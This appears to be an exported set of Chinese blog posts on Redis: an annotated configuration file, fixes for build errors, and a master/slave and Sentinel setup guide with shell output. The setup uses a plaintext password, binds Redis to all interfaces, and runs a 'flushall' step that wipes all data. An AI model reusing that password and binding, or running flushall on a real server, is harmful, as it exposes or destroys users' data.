上，指定值（秒）用于发送 ACKs 的时间。注意关闭连接需要双倍的时间。默认为 0 。tcp-keepalive 0# 指定日志记录级别，生产环境推荐 notice# Redis 总共支持四个级别： debug 、 verbose 、 notice 、 warning ，默认为 verbose# debug 记录很多信息，用于开发和测试# varbose 有用的信息，不像 debug 会记录那么多# notice 普通的 verbose ，常用于生产环境# warning 只有非常重要或者严重的信息会记录到日志loglevel notice# 配置 log 文件地址# 默认值为 stdout ，标准输出，若后台模式会输出到 /dev/null 。logfile /var/log/redis/redis.log# 可用数据库数# 默认值为 16 ，默认数据库为 0 ，数据库范围在 0- （ database-1 ）之间databases 16################################ 快照################################## 保存数据到磁盘，格式如下 :# save &lt;seconds&gt; &lt;changes&gt;# 指出在多长时间内，有多少次更新操作，就将数据同步到数据文件 rdb 。# 相当于条件触发抓取快照，这个可以多个条件配合# 比如默认配置文件中的设置，就设置了三个条件# save 900 1 900 秒内至少有 1 个 key 被改变# save 300 10 300 秒内至少有 300 个 key 被改变# save 60 10000 60 秒内至少有 10000 个 key 被改变# save 900 1# save 300 10# save 60 10000# 后台存储错误停止写。stop-writes-on-bgsave-error yes# 存储至本地数据库时（持久化到 rdb 文件）是否压缩数据，默认为 yesrdbcompression yes# RDB 文件的是否直接偶像 chcksumrdbchecksum yes# 本地持久化数据库文件名，默认值为 dump.rdbdbfilename dump.rdb# 工作目录# 数据库镜像备份的文件放置的路径。# 这里的路径跟文件名要分开配置是因为 redis 在进行备份时，先会将当前数据库的状态写入到一个临时文件中，等备份完成，# 再把该该临时文件替换为上面所指定的文件，而这里的临时文件和上面所配置的备份文件都会放在这个指定的路径当中。# AOF 文件也会存放在这个目录下面# 注意这里必须制定一个目录而不是文件dir /var/lib/redis-server/################################# 复制 ################################## 主从复制 . 设置该数据库为其他数据库的从数据库 .# 设置当本机为 slav 服务时，设置 master 服务的 IP 地址及端口，在 Redis 启动时，它会自动从 master 进行数据同步# slaveof &lt;masterip&gt;&lt;masterport&gt;# 当 master 服务设置了密码保护时 ( 用 requirepass 制定的密码 )# slave 服务连接 master 的密码# masterauth &lt;master-password&gt;# 当从库同主机失去连接或者复制正在进行，从机库有两种运行方式：# 1) 如果 slave-serve-stale-data 设置为 yes( 默认设置 ) ，从库会继续响应客户端的请求# 2) 如果 slave-serve-stale-data 是指为 no ，出去 INFO 和 SLAVOF 命令之外的任何请求都会返回一个# 错误 \"SYNC with master in progress\"slave-serve-stale-data yes# 配置 slave 实例是否接受写。写 slave 对存储短暂数据（在同 master 数据同步后可以很容易地被删除）是有用的，但未配置的情况下，客户端写可能会发送问题。# 从 Redis2.6 后，默认 slave 为 read-onlyslaveread-only yes# 从库会按照一个时间间隔向主库发送 PINGs. 可以通过 repl-ping-slave-period 设置这个时间间隔，默认是 10 秒# repl-ping-slave-period 10# repl-timeout 设置主库批量数据传输时间或者 ping 回复时间间隔，默认值是 60 秒# 一定要确保 repl-timeout 大于 repl-ping-slave-period# repl-timeout 60# 在 slave socket 的 SYNC 后禁用 TCP_NODELAY# 如果选择“ yes ” ,Redis 将使用一个较小的数字 TCP 数据包和更少的带宽将数据发送到 slave ， 但是这可能导致数据发送到 slave 端会有延迟 , 如果是 Linux kernel 的默认配置，会达到 40 毫秒 .# 如果选择 \"no\" ，则发送数据到 slave 端的延迟会降低，但将使用更多的带宽用于复制 .repl-disable-tcp-nodelay no# 设置复制的后台日志大小。# 复制的后台日志越大， slave 断开连接及后来可能执行部分复制花的时间就越长。# 后台日志在至少有一个 slave 连接时，仅仅分配一次。# repl-backlog-size 1mb# 在 master 不再连接 slave 后，后台日志将被释放。下面的配置定义从最后一个 slave 断开连接后需要释放的时间（秒）。# 0 意味着从不释放后台日志# repl-backlog-ttl 3600# 如果 master 不能再正常工作，那么会在多个 slave 中，选择优先值最小的一个 slave 提升为 master ，优先值为 0 表示不能提升为 master 。slave-priority 100# 如果少于 N 个 slave 连接，且延迟时间 &lt;=M 秒，则 master 可配置停止接受写操作。# 例如需要至少 3 个 slave 连接，且延迟 &lt;=10 秒的配置：# min-slaves-to-write 3# min-slaves-max-lag 10# 设置 0 为禁用# 默认 min-slaves-to-write 为 0 （禁用）， min-slaves-max-lag 为 10################################## 安全 #################################### 设置客户端连接后进行任何其他指定前需要使用的密码。# 警告：因为 redis 速度相当快，所以在一台比较好的服务器下，一个外部的用户可以在一秒钟进行 150K 次的密码尝试，这意味着你需要指定非常非常强大的密码来防止暴力破解# requirepass foobared# 命令重命名 .# 在一个共享环境下可以重命名相对危险的命令。比如把 CONFIG 重名为一个不容易猜测的字符。# 举例 :# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52# 如果想删除一个命令，直接把它重命名为一个空字符 \"\" 即可，如下：# rename-command CONFIG \"\"################################### 约束####################################设置同一时间最大客户端连接数，默认无限制， #Redis 可以同时打开的客户端连接数为 Redis 进程可以打开的最大文件描述符数，#如果设置 maxclients 0 ，表示不作限制。#当客户端连接数到达限制时， Redis 会关闭新的连接并向客户端返回 max number of clients reached 错误信息# maxclients 10000# 指定 Redis 最大内存限制， Redis 在启动时会把数据加载到内存中，达到最大内存后， Redis 会按照清除策略尝试清除已到期的 Key# 如果 Redis 依照策略清除后无法提供足够空间，或者策略设置为 ”noeviction” ，则使用更多空间的命令将会报错，例如 SET, LPUSH 等。但仍然可以进行读取操作# 注意： Redis 新的 vm 机制，会把 Key 存放内存， Value 会存放在 swap 区# 该选项对 LRU 策略很有用。# maxmemory 的设置比较适合于把 redis 当作于类似 memcached 的缓存来使用，而不适合当做一个真实的 DB 。# 当把 Redis 当做一个真实的数据库使用的时候，内存使用将是一个很大的开销# maxmemory &lt;bytes&gt;# 当内存达到最大值的时候 Redis 会选择删除哪些数据？有五种方式可供选择# volatile-lru -&gt; 利用 LRU 算法移除设置过过期时间的 key (LRU: 最近使用 Least RecentlyUsed )# allkeys-lru -&gt; 利用 LRU 算法移除任何 key# volatile-random -&gt; 移除设置过过期时间的随机 key# allkeys-&gt;random -&gt; remove a randomkey, any key# volatile-ttl -&gt; 移除即将过期的 key(minor TTL)# noeviction -&gt; 不移除任何可以，只是返回一个写错误# 注意：对于上面的策略，如果没有合适的 key 可以移除，当写的时候 Redis 会返回一个错误# 默认是 : volatile-lru# maxmemory-policy volatile-lru # LRU 和 minimal TTL 算法都不是精准的算法，但是相对精确的算法 ( 为了节省内存 ) ，随意你可以选择样本大小进行检测。# Redis 默认的灰选择 3 个样本进行检测，你可以通过 maxmemory-samples 进行设置# maxmemory-samples 3############################## AOF################################ 默认情况下， redis 会在后台异步的把数据库镜像备份到磁盘，但是该备份是非常耗时的，而且备份也不能很频繁，如果发生诸如拉闸限电、拔插头等状况，那么将造成比较大范围的数据丢失。# 所以 redis 提供了另外一种更加高效的数据库备份及灾难恢复方式。# 开启 append only 模式之后， redis 会把所接收到的每一次写操作请求都追加到 appendonly.aof 文件中，当 redis 重新启动时，会从该文件恢复出之前的状态。# 但是这样会造成 appendonly.aof 文件过大，所以 redis 还支持了 BGREWRITEAOF 指令，对 appendonly.aof 进行重新整理。# 你可以同时开启 asynchronous dumps 和 AOFappendonly no# AOF 文件名称 ( 默认 : \"appendonly.aof\")# appendfilename appendonly.aof# Redis 支持三种同步 AOF 文件的策略 :# no: 不进行同步，系统去操作 . Faster.# always: always 表示每次有写操作都进行同步 . Slow, Safest.# everysec: 表示对写操作进行累积，每秒同步一次 . Compromise.# 默认是 \"everysec\" ，按照速度和安全折中这是最好的。# 如果想让 Redis 能更高效的运行，你也可以设置为 \"no\" ，让操作系统决定什么时候去执行# 或者相反想让数据更安全你也可以设置为 \"always\"# 如果不确定就用 \"everysec\".# appendfsync alwaysappendfsync everysec# appendfsync no# AOF 策略设置为 always 或者 everysec 时，后台处理进程 ( 后台保存或者 AOF 日志重写 ) 会执行大量的 I/O 操作# 在某些 Linux 配置中会阻止过长的 fsync() 请求。注意现在没有任何修复，即使 fsync 在另外一个线程进行处理# 为了减缓这个问题，可以设置下面这个参数 no-appendfsync-on-rewriteno-appendfsync-on-rewrite no# AOF 自动重写# 当 AOF 文件增长到一定大小的时候 Redis 能够调用 BGREWRITEAOF 对日志文件进行重写# 它是这样工作的： Redis 会记住上次进行些日志后文件的大小 ( 如果从开机以来还没进行过重写，那日子大小在开机的时候确定 )# 基础大小会同现在的大小进行比较。如果现在的大小比基础大小大制定的百分比，重写功能将启动# 同时需要指定一个最小大小用于 AOF 重写，这个用于阻止即使文件很小但是增长幅度很大也去重写 AOF 文件的情况# 设置 percentage 为 0 就关闭这个特性auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb################################ LUASCRIPTING ############################## 一个 Lua 脚本最长的执行时间为 5000 毫秒（ 5 秒），如果为 0 或负数表示无限执行时间。lua-time-limit 5000################################LOW LOG################################# Redis Slow Log 记录超过特定执行时间的命令。执行时间不包括 I/O 计算比如连接客户端，返回结果等，只是命令执行时间# 可以通过两个参数设置 slow log ：一个是告诉 Redis 执行超过多少时间被记录的参数 slowlog-log-slower-than( 微妙 ) ，# 另一个是 slow log 的长度。当一个新命令被记录的时候最早的命令将被从队列中移除# 下面的时间以微妙为单位，因此 1000000 代表一秒。# 注意指定一个负数将关闭慢日志，而设置为 0 将强制每个命令都会记录slowlog-log-slower-than 10000# 对日志长度没有限制，只是要注意它会消耗内存# 可以通过 SLOWLOG RESET 回收被慢日志消耗的内存# 推荐使用默认值 128 ，当慢日志超过 128 时，最先进入队列的记录会被踢出slowlog-max-len 128################################ 事件通知 ############################## 当事件发生时， Redis 可以通知 Pub/Sub 客户端。# 可以在下表中选择 Redis 要通知的事件类型。事件类型由单个字符来标识：# K Keyspace 事件，以 _keyspace@&lt;db&gt;_ 的前缀方式发布# E Keyevent 事件，以 _keysevent@&lt;db&gt;_ 的前缀方式发布# g 通用事件（不指定类型），像 DEL, EXPIRE, RENAME, …# $ String 命令# s Set 命令# h Hash 命令# z 有序集合命令# x 过期事件（每次 key 过期时生成）# e 清除事件（当 key 在内存被清除时生成）# A g$lshzxe 的别称，因此 ”AKE” 意味着所有的事件# notify-keyspace-events 带一个由 0 到多个字符组成的字符串参数。空字符串意思是通知被禁用。# 例子：启用 list 和通用事件：# notify-keyspace-events Elg# 默认所用的通知被禁用，因为用户通常不需要改特性，并且该特性会有性能损耗。# 注意如果你不指定至少 K 或 E 之一，不会发送任何事件。notify-keyspace-events “”############################## 高级配置 ################################ 当 hash 中包含超过指定元素个数并且最大的元素没有超过临界时，# hash 将以一种特殊的编码方式（大大减少内存使用）来存储，这里可以设置这两个临界值# Redis Hash 对应 Value 内部实际就是一个 HashMap ，实际这里会有 2 种不同实现，# 这个 Hash 的成员比较少时 Redis 为了节省内存会采用类似一维数组的方式来紧凑存储，而不会采用真正的 HashMap 结构，对应的 valueredisObject 的 encoding 为 zipmap,# 当成员数量增大时会自动转成真正的 HashMap, 此时 encoding 为 ht 。hash-max-zipmap-entries 512hash-max-zipmap-value 64 # 和 Hash 一样，多个小的 list 以特定的方式编码来节省空间。# list 数据类型节点值大小小于多少字节会采用紧凑存储格式。list-max-ziplist-entries 512list-max-ziplist-value 64# set 数据类型内部数据如果全部是数值型，且包含多少节点以下会采用紧凑格式存储。set-max-intset-entries 512# 和 hashe 和 list 一样 , 排序的 set 在指定的长度内以指定编码方式存储以节省空间# zsort 数据类型节点值大小小于多少字节会采用紧凑存储格式。zset-max-ziplist-entries 128zset-max-ziplist-value 64# Redis 将在每 100 毫秒时使用 1 毫秒的 CPU 时间来对 redis 的 hash 表进行重新 hash ，可以降低内存的使用# 当你的使用场景中，有非常严格的实时性需要，不能够接受 Redis 时不时的对请求有 2 毫秒的延迟的话，把这项配置为 no 。# 如果没有这么严格的实时性要求，可以设置为 yes ，以便能够尽可能快的释放内存activerehashing yes# 客户端的输出缓冲区的限制，因为某种原因客户端从服务器读取数据的速度不够快，# 可用于强制断开连接（一个常见的原因是一个发布 / 订阅客户端消费消息的速度无法赶上生产它们的速度）。# 可以三种不同客户端的方式进行设置：# normal -&gt; 正常客户端# slave -&gt; slave 和 MONITOR 客户端# pubsub -&gt; 至少订阅了一个 pubsub channel 或 pattern 的客户端# 每个 client-output-buffer-limit 语法 :# client-output-buffer-limit &lt;class&gt;&lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;# 一旦达到硬限制客户端会立即断开，或者达到软限制并保持达成的指定秒数（连续）。# 例如，如果硬限制为 32 兆字节和软限制为 16 兆字节 /10 秒，客户端将会立即断开# 如果输出缓冲区的大小达到 32 兆字节，客户端达到 16 兆字节和连续超过了限制 10 秒，也将断开连接。# 默认 normal 客户端不做限制，因为他们在一个请求后未要求时（以推的方式）不接收数据，# 只有异步客户端可能会出现请求数据的速度比它可以读取的速度快的场景。# 把硬限制和软限制都设置为 0 来禁用该特性client-output-buffer-limit normal 0 0 0client-output-buffer-limit slave 256mb 64mb60client-output-buffer-limit pubsub 32mb 8mb60# Redis 调用内部函数来执行许多后台任务，如关闭客户端超时的连接，清除过期的 Key ，等等。# 不是所有的任务都以相同的频率执行，但 Redis 依照指定的“ Hz ”值来执行检查任务。# 默认情况下，“ Hz ”的被设定为 10 。# 提高该值将在 Redis 空闲时使用更多的 CPU 时，但同时当有多个 key 同时到期会使 Redis 的反应更灵敏，以及超时可以更精确地处理。# 范围是 1 到 500 之间，但是值超过 100 通常不是一个好主意。# 大多数用户应该使用 10 这个预设值，只有在非常低的延迟的情况下有必要提高最大到 100 。hz 10 # 当一个子节点重写 AOF 文件时，如果启用下面的选项，则文件每生成 32M 数据进行同步。aof-rewrite-incremental-fsync yes ####8. redis修改持久化路径和日志路径vim redis.conflogfile /data/redis_cache/logs/redis.log #日志路径dir /data/redis_cache #持久化路径，修改后 记得要把dump.rdb持久化文件拷贝到/data/redis_cache下 先杀掉redis，拷贝dump.rdb，启动 ####9. 清redis缓存 1234./redis-cli #进入dbsizeflushall #执行exit","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Redis安装报错总结-文件解释","slug":"数据库/Redis/Redis安装报错-报错搜集","date":"2015-11-20T06:47:27.000Z","updated":"2016-10-13T08:49:24.000Z","comments":true,"path":"2015/11/20/数据库/Redis/Redis安装报错-报错搜集/","link":"","permalink":"http://blog.yangcvo.me/2015/11/20/数据库/Redis/Redis安装报错-报错搜集/","excerpt":"","text":"###安装的时候最新安装包，3.0.7 异常一： 报错：error: jemalloc/jemalloc.h: No such file or directory 12345zmalloc.h:50:31: error: jemalloc/jemalloc.h: No such file or directoryzmalloc.h:55:2: error: #error \"Newer version of jemalloc required\"make[1]: *** [adlist.o] Error 1make[1]: Leaving directory `/data0/src/redis-2.6.2/src'make: *** [all] Error 2 解决方案：make MALLOC=libc然后在make &amp;&amp; make install这样就行如果还报错，先清除下make clean 然后在make &amp;&amp; make install 异常二：make[2]: cc: Command not found异常原因：没有安装gcc解决方案：yum install gcc-c++异常三：zmalloc.h:51:31: error: jemalloc/jemalloc.h: No such file or directory异常原因：一些编译依赖或原来编译遗留出现的问题 解决方案：make distclean。清理一下，然后再make。 在make成功以后，需要make test。在make test出现异常。 异常四：couldn’t execute “tclsh8.5”: no such file or directory异常原因：没有安装tcl解决方案：yum install -y tcl。 Redis安装完成之后，会生成四个文件，如下： redis-server、redis-cli、redis-benchmark、redis-stat，它们的作用如下： redis-server Redis服务器的daemon启动程序 redis-cli Redis命令行操作工具。当然，你也可以用telnet根据其纯文本协议来操作 redis-benchmark Redis性能测试工具，测试Redis在你的系统及你的配置下的读写性能 redis-stat Redis状态检测工具，可以检测Redis当前状态参数及延迟状况","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Redis主从集群搭建及容灾部署","slug":"数据库/Redis/Redis-Sentinel哨兵服务实现redis主从集群搭建及容灾部署","date":"2015-11-19T03:44:54.000Z","updated":"2016-10-12T02:28:18.000Z","comments":true,"path":"2015/11/19/数据库/Redis/Redis-Sentinel哨兵服务实现redis主从集群搭建及容灾部署/","link":"","permalink":"http://blog.yangcvo.me/2015/11/19/数据库/Redis/Redis-Sentinel哨兵服务实现redis主从集群搭建及容灾部署/","excerpt":"","text":"Redis-主从复制原理及分析Slave向Master同步的实现是：Slave向Master发出同步请求（发送sync命令），Master先dump出rdb文件，然后将rdb文件全量传输给slave，然后Master把缓存的写命令转发给Slave，初次同步完成。 以及以后的同步实现是：123Master将变量的快照直接实时依次发送给各个Slave。但不管什么原因导致Slave和Master断开重连都会重复以上两个步骤的过程。Redis的主从复制是建立在内存快照的持久化基础上的，只要有Slave就一定会有内存快照发生。 主从复制原理总结几点：123456789101112131.Slave启动后，无论是第一次连接还是重连到Master，它都会主动发出一个SYNC命令2.当Master收到SYNC命令之后，将会执行BGSAVE(后台存盘进程)，即在后台保存数据到磁盘（rdb快照文件），同时收集所有新收到的写入和修改数据集的命令存入缓冲区（非查询类）3.Master在后台把数据保存到快照文件完成后，会传送整个数据库文件到Slave4.Slave接收到数据库文件后，会把内存清空，然后加载该文件到内存中以完成一次完全同步5.然后Master会把之前收集到缓冲区中的命令和新的修改命令依次传送给Slave6.Slave接受到之后在本地执行这些数据修改命令，从而达到最终的数据同步7.之后Master与Slave之间将会不断的通过异步方式进行命令的同步，从而保证数据的时时同步8.如果Master和Slave之间的链接出现断连，Slave可以自动重连Master。根据版本的不同，断连后同步的方式也不同：2.8之前：重连成功之后，一次全量同步操作将被自动执行2.8之后：重连成功之后，进行部分同步操作 Redis-sentinel原理分析123Redis-sentinel是Redis实例的监控管理、通知和实例失效备援服务，是Redis集群的管理工具。在一般的分布式中心节点数据库中，Redis-sentinel的作用是中心节点的工作，监控各个其他节点的工作情况并且进行故障恢复，来提高集群的高可用性。Redis-sentinel是Redis的作者antirez在2013年6月份完成的，因为Redis实例在各个大公司的应用，每个公司都需要一个Redis集群的管理工具，被迫都自己写管理工具来管理Redis集群，antirez考虑到社区的急迫需要，花了几个星期写出了Redis-sentinel。 Redis-sentinel三大功能1Redis-sentinel的三大功能：监测、通知、自动故障恢复。首先Redis-sentinel要建立一个监控的master列表，然后针对master列表的每个master获取监控其的sentinels和slaves供以后故障恢复使用。 前言：网站的访问量慢慢上来了。为了网站的性能方面，开始用了redis做缓存策略。刚开始的时候，redis是一个单点，当一台机器岩机的时候，redis的 服务完全停止，这时就会影响其他服务的正常运行。费话不多说了，下面利用redis sentinel做一个主从切换的集群管理。做这个集群管理的时候，查过很多资料才完全了解，从数据类型、主从原理、持久化方式等方面着手看了不少资料，也进行了一些实践操作。redis的配置都比较简单，网络上相关资料比较多，把实践的过程记录下来以备查阅。 补充摘要：123redis 安装包：http://redis.io/download中文redis社区:http://redis.cn/community.html参考资料：http://redis.io/topics/sentinel 系统环境环境：这里我用kvm 虚拟出三台服务器：然后搭好了环境。 123456virsh # list --all Id 名称 状态------------------------------------------------- 1 redis_sentinel running 2 LAN_redis2 running 3 LAN_redis1 running 集群配置最少需要三台机器，那么我就三台虚拟机,三台虚拟机分别安装同样的redis的环境 ip分别： 192.168.1.172 （redis sentinel 集群监控） 192.168.1.173 （redis master 节点） 192.168.1.174 （redis slave 节点） 123[root@sentinel ~]# cat /etc/issueCentOS release 6.7 (Final)Kernel \\r on an \\m redis安装配置:下载，解压和编译Redis的：master默认配置： master：12345678910111213141516171819202122232425262728293031323334353637383940414243444546[root@LAN_redis1 ~]# curl -O http://download.redis.io/releases/redis-3.2.1.tar.gz -C /tmp/.[root@LAN_redis1 ~]# tar xzf redis-3.2.1.tar.gz -C /usr/local/.[root@LAN_redis1 ~]# cd /usr/local/redis-3.2.1/[root@LAN_redis1 redis-3.2.1]# make[root@LAN_redis1 redis-3.2.1]# src/redis-server4772:C 20 Jun 18:43:42.681 # Warning: no config file specified, using the default config. In order to specify a config file use src/redis-server /path/to/redis.conf _._ _.-``__ ''-._ _.-`` `. `_. ''-._ Redis 3.2.1 (00000000/0) 64 bit .-`` .-```. ```\\/ _.,_ ''-._ ( ' , .-` | `, ) Running in standalone mode |`-._`-...-` __...-.``-._|'` _.-'| Port: 6379 | `-._ `._ / _.-' | PID: 4772 `-._ `-._ `-./ _.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | http://redis.io `-._ `-._`-.__.-'_.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | `-._ `-._`-.__.-'_.-' _.-' `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'4772:M 20 Jun 18:43:42.683 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.4772:M 20 Jun 18:43:42.683 # Server started, Redis version 3.2.14772:M 20 Jun 18:43:42.683 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.4772:M 20 Jun 18:43:42.683 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.4772:M 20 Jun 18:43:42.683 * The server is now ready to accept connections on port 6379这里提醒：Ctrl+C 退出 以后执行：src/redis-server &amp;这样让服务都在后台执行。就不需要重新开启终端了。[root@LAN_redis1 redis-3.2.1]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 4780/src/redis-servtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1381/sshdtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1461/mastertcp 0 0 :::6379 :::* LISTEN 4780/src/redis-servtcp 0 0 :::22 :::* LISTEN 1381/sshdtcp 0 0 ::1:25 :::* LISTEN 1461/master这里我们都先关闭服务：[root@LAN_redis1 redis-3.2.1]# /usr/local/redis-3.2.1/src/redis-cli -n 6379 shutdown redis master 配置：12345678910111213141516创建日志目录[root@LAN_redis1 redis-3.2.1]# mkdir /var/log/redis[root@LAN_redis1 redis-3.2.1]# touch /var/log/redis/redis.log创建数据目录[root@LAN_redis2 redis-3.2.1]# mkdir -p /data/redis找到配置文件/usr/local/redis-3.2.1/redis.conf[root@LAN_redis1 redis-3.2.1]# vim redis.conf修改如下内容：#bind 127.0.0.1 # 注释daemonize no 改为 yes # 是否后台运行port 6379 这里端口我保持默认不做修改。logfile \"/var/log/redis/redis.log\" ## 添加日志保存绝对路径。dir /data/redis/ # 数据目录 masterauth \"ghost+db@hz2016\"requirepass \"ghost+db@hz2016\" 设置密码 slave:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[root@LAN_redis2 ~]# curl -O http://download.redis.io/releases/redis-3.2.1.tar.gz -C /tmp/.[root@LAN_redis2 ~]# tar xzf redis-3.2.1.tar.gz -C /usr/local/.[root@LAN_redis2 ~]# cd /usr/local/redis-3.2.1/[root@LAN_redis2 redis-3.2.1]# make[root@LAN_redis2 redis-3.2.1]# src/redis-server7263:C 20 Jun 18:46:14.140 # Warning: no config file specified, using the default config. In order to specify a config file use src/redis-server /path/to/redis.conf _._ _.-``__ ''-._ _.-`` `. `_. ''-._ Redis 3.2.1 (00000000/0) 64 bit .-`` .-```. ```\\/ _.,_ ''-._ ( ' , .-` | `, ) Running in standalone mode |`-._`-...-` __...-.``-._|'` _.-'| Port: 6379 | `-._ `._ / _.-' | PID: 7263 `-._ `-._ `-./ _.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | http://redis.io `-._ `-._`-.__.-'_.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | `-._ `-._`-.__.-'_.-' _.-' `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'7263:M 20 Jun 18:46:14.142 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.7263:M 20 Jun 18:46:14.142 # Server started, Redis version 3.2.17263:M 20 Jun 18:46:14.142 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.7263:M 20 Jun 18:46:14.143 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.7263:M 20 Jun 18:46:14.143 * The server is now ready to accept connections on port 6379这里提醒：Ctrl+C 退出 以后执行：src/redis-server &amp;这样让服务都在后台执行。就不需要重新开启终端了。测试：[root@LAN_redis2 redis-3.2.1]# src/redis-cli127.0.0.1:6379&gt; set foo barOK127.0.0.1:6379&gt; get foo\"bar\"127.0.0.1:6379&gt;[root@LAN_redis2 redis-3.2.1]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 7266/src/redis-servtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 3810/sshdtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1363/mastertcp 0 0 :::6379 :::* LISTEN 7266/src/redis-servtcp 0 0 :::22 :::* LISTEN 3810/sshdtcp 0 0 ::1:25 :::* LISTEN 1363/master redis slave 配置：1234567891011121314151617创建日志目录[root@LAN_redis2 redis-3.2.1]# mkdir /var/log/redis[root@LAN_redis2 redis-3.2.1]# touch /var/log/redis/redis.log创建数据目录[root@LAN_redis2 redis-3.2.1]# mkdir -p /data/redis找到配置文件/usr/local/redis-3.2.1/redis.conf[root@LAN_redis2 redis-3.2.1]# vim redis.conf修改如下内容：#bind 127.0.0.1 # 注释daemonize no 改为 yes # 是否后台运行port 6379 这里端口我保持默认不做修改。logfile \"/var/log/redis/redis.log\" ## 添加日志保存绝对路径。dir /data/redis/ # 数据目录 slaveof 192.168.1.173 6379 # slaveof master的ip master的端口 设置当本机为 slav 服务时，设置 master 服务的 IP 地址及端口，在 Redis 启动时，它会自动从 master 进行数据同步masterauth \"ghost+db@hz2016\" ## 当 master 服务设置了密码保护时， slav 服务连接 master 的密码requirepass \"ghost+db@hz2016\" 设置密码 配置附件：剩下的后面默认就好.这里主从我设置了密码：master和slave 都需要设置密码，不然同步不成功。不成功报错日志：128395:S 21 Jun 14:09:22.073 * MASTER &lt;-&gt; SLAVE sync started8395:S 21 Jun 14:09:22.073 # Error condition on socket for SYNC: Connection refused 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556protected-mode yes port 6379 # 监听端口tcp-backlog 511 # TCP接收队列长度，受/proc/sys/net/core/somaxconn和tcp_max_syn_backlog这两个内核参数的影响timeout 0 ## 一个客户端空闲多少秒后关闭连接(0代表禁用，永不关闭)tcp-keepalive 300daemonize yes # 守护进程模式supervised nopidfile /var/run/redis_6379.pidmasterauth \"ghost+db@hz2016\" # 当master服务设置了密码保护时，slav服务连接master的密码loglevel noticelogfile \"/var/log/redis/redis.log\" # 指明日志文件名databases 16save 900 1 ## 900秒内有1次修改将会保存save 300 10 ## 300秒内有10次修改将会保存save 60 10000 ## 60秒内有10000次修改保存stop-writes-on-bgsave-error yes # 默认如果开启RDB快照(至少一条save指令)并且最新的后台保存失败，Redis将会停止接受写操作# 这将使用户知道数据没有正确的持久化到硬盘，否则可能没人注意到并且造成一些灾难rdbcompression yes ## 开启rdb压缩rdbchecksum yes # 版本5的RDB有一个CRC64算法的校验和放在了文件的最后。这将使文件格式更加可靠。dbfilename dump.rdb ## DB名字dir /data/redis/ ## 工作目录，一定要指定requirepass \"ghost+db@hz2016\" 设置redis访问的密码 # 密码验证# 警告：因为Redis太快了，所以外面的人可以尝试每秒150k的密码来试图破解密码。这意味着你需要# 一个高强度的密码，否则破解太容易了slave-serve-stale-data yesslave-read-only yesrepl-diskless-sync norepl-diskless-sync-delay 5repl-disable-tcp-nodelay noslave-priority 100appendonly noappendfilename \"appendonly.aof\"appendfsync everysecno-appendfsync-on-rewrite noauto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mbaof-load-truncated yeslua-time-limit 5000slowlog-log-slower-than 10000slowlog-max-len 128latency-monitor-threshold 0notify-keyspace-events \"\"hash-max-ziplist-entries 512hash-max-ziplist-value 64list-max-ziplist-size -2list-compress-depth 0set-max-intset-entries 512zset-max-ziplist-entries 128zset-max-ziplist-value 64hll-sparse-max-bytes 3000activerehashing yesclient-output-buffer-limit normal 0 0 0client-output-buffer-limit slave 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60hz 10aof-rewrite-incremental-fsync yes 启动master：12345678910111213141516[root@LAN_redis1 redis-3.2.1]# /usr/local/redis-3.2.1/src/redis-server /usr/local/redis-3.2.1/redis.conf &amp;[1] 5738[root@LAN_redis1 redis-3.2.1]#[1]+ Done /usr/local/redis-3.2.1/src/redis-server /usr/local/redis-3.2.1/redis.conf[root@LAN_redis1 redis-3.2.1]#[root@LAN_redis1 redis-3.2.1]#[root@LAN_redis1 redis-3.2.1]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 192.168.1.173:10050 0.0.0.0:* LISTEN 1479/zabbix_agentdtcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 5739/redis-server *tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1381/sshdtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1461/mastertcp 0 0 :::6379 :::* LISTEN 5739/redis-server *tcp 0 0 :::22 :::* 